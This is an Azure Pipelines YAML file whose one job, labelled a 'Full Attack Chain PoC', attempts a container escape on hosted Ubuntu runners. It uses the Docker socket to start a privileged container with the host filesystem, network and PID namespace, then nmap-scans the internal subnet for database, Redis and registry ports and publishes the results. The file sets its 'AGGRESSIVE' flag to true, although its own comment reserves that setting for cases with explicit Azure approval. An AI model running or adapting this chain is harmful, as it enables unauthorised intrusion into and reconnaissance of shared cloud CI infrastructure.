# azure-pipelines.yml

trigger:
  - main

pr:
  - main

name: $(Date:yyyyMMdd)$(Rev:.r)

variables:
  SAFE_PORTS: "22,80,135,443,3306,3389,5432,6379,8080,8443"
  IMDS_API: "2021-02-01"
  ATTEST_API: "2018-10-01"
  # Flip to 'true' ONLY with explicit Azure approval (enables Redis PING + minimal Docker host-escape proof)
  AGGRESSIVE: "true"

stages:
- stage: Recon
  displayName: Hosted runner recon & provenance
  jobs:

  # ------------------------- L I N U X -------------------------
  - job: full_attack_chain_poc
    displayName: 'Linux Step 3: Full Attack Chain PoC (Host Escape & Targeted Scan)'
    dependsOn: linux_recon_escape_vector_check # Keep this dependency
    pool:
      vmImage: 'ubuntu-22.04'
    steps:
    - checkout: none
    - task: Bash@3
      displayName: 'Attempt Container Escape and Hunt for Open Services'
      inputs:
        targetType: inline
        script: |
          set -euo pipefail
          mkdir -p artifacts

          echo "--- Checking for Docker socket and group permissions ---"
          if [ -S "/var/run/docker.sock" ] && getent group docker && id | grep -q '(docker)'; then
            echo "✅ SUCCESS: User is in the 'docker' group and socket is present."
            
            echo "--- Installing Nmap inside container for later use from host ---"
            sudo apt-get update >/dev/null && sudo apt-get install -y nmap >/dev/null
            
            SUBNET=$(ip -o -f inet addr show eth0 | awk '{print $4}')
            echo "Discovered internal subnet: $SUBNET"
            
            # Define a list of high-value ports to hunt for, based on previous findings.
            # 5000 (Docker Registry), 6379 (Redis), 5432 (PostgreSQL), 3306 (MySQL), 8080 (http-alt)
            TARGET_PORTS="5000,6379,5432,3306,8080"
            
            echo "--- ESCAPING CONTAINER to hunt for open ports ($TARGET_PORTS) on the host's network ---"
            
            # We use '-sT' for a TCP connect scan and '--open' to only report hosts with open ports.
            docker run --rm --privileged --network=host --pid=host -v /:/hostfs -v /usr/bin/nmap:/usr/bin/nmap \
              alpine:latest chroot /hostfs /usr/bin/nmap -sT -T4 -p $TARGET_PORTS --open $SUBNET | tee artifacts/host-escape-TARGETED-scan.txt
              
            echo "✅ HUNT COMPLETE: Targeted scan from host finished."
            echo "Review the 'host-escape-TARGETED-scan.txt' artifact for any open services."
          else
            echo "❌ TEST INCONCLUSIVE: The container escape vector was not found."
            id
            ls -l /var/run/docker.sock || echo "Socket not found."
            exit 1
          fi
    - task: PublishPipelineArtifact@1
      displayName: 'Publish Attack PoC Artifacts'
      condition: succeededOrFailed()
      inputs:
        targetPath: 'artifacts'
        artifact: 'azure-poc-linux-step3-host-escape'
